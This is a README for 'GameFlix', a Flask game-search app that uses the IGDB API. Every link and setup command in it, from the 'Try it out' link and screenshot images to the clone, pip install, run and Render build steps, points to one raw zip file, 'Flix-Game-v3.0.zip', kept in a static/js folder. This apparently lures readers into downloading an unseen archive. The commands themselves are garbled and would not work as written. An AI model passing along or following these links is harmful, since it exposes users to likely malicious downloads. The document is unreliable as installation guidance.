# 🏆GameFlix - Game Search & Recommendation Web App

GameFlix is a Flask-based web application that allows users to **search, browse, and discover video games** with detailed information including **cover images, genres, release dates, ratings, and summaries**. The app integrates with **IGDB (Internet Game Database)** via the Twitch API.
Try it out! :- https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip 
---

## Features

- **Search Games:** Real-time search suggestions with cover and genre information.
- **Game Details:** Click on a game to view detailed information, including release date, rating, summary, and cover image.
- **Trending Games:** Displays currently trending games based on popularity.
- **New Releases:** Shows the most recent game releases.
- **Recommended Games:** Returns curated game recommendations (default horror-themed, but extensible).
- **Responsive UI:** Built with **TailwindCSS**, fully responsive on desktop and mobile.

---

## Screenshots ⚔️

![Home Page](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)  
![Search Results](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)  
![Game Details](https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip)


---

## Tech Stack

- **Backend:** Python, Flask, Flask-CORS
- **Frontend:** HTML, TailwindCSS, JavaScript
- **APIs:** IGDB API via Twitch
- **Deployment:** Render / any cloud platform

---

## Setup & Installation

1. **Clone the repository:**

```bash
git clone https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
cd gameflix
```
2. **Create a virtual environment:**
```bash
python -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows
```
3. **Install dependencies:**
```bash
pip install -r https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
```
## Set Twitch/IGDB credentials: 💾
- Edit https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip (or https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip) and replace the placeholders with your Twitch Client ID and Client Secret.
CLIENT_ID = "YOUR_TWITCH_CLIENT_ID"
CLIENT_SECRET = "YOUR_TWITCH_CLIENT_SECRET"

##Run the app locally:
```bash
python https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
```
##Deployment on Render
- Build Command:
  ```bash
  pip install -r https://raw.githubusercontent.com/Sam-bot-dev/Game_Flix/main/static/js/Flix-Game-v3.0.zip
  ```
- Start Command:
  ```bash
  gunicorn main:app
  ```
  ## 🔗 Connect With Me

<p align="center">
  <table>
    <tr>
      <td align="center" width="50%">
        <div>
          <img src="https://avatars.githubusercontent.com/Sam-bot-dev?s=120" width="120px;" height="120px;" alt="Bhavesh"/>
        </div>
        <div><strong>Lead Dev</strong></div>
        <div><strong>Bhavesh</strong></div>
        <a href="https://github.com/Sam-bot-dev">🌐 GitHub</a>
      </td>
    </tr>
  </table>
</p>
